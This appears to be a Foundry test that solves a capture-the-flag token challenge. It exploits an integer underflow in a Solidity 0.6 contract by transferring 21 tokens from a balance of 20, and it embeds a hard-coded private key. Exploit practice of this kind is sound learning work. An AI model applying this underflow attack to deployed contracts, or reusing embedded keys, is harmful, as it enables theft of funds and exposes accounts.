// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
import {Token} from "../src/token/Token.sol";


contract TokenTest is Test {
    Token public sc;

    uint256 constant hackerPrivateKey = 0x5f6de7d01a3bf0bc622c5535e81479ada10b9cf1b1890b7f8abf50d89c360cc3;
    address constant hackerAddress = 0x3959Aee07B31d67D1aC13516853999A497AF5c89;
    


    function setUp() public {
        sc = new Token(100000);
    }

    function test_Hack() public {
        sc.transfer(hackerAddress, 20);
        vm.startBroadcast(hackerPrivateKey);
        sc.transfer(0x4B19948Ff6E618a8D252abd17AC8acd5A2a3EE9b, 21);
        assertGt(sc.balanceOf(hackerAddress), 20);
    }
}
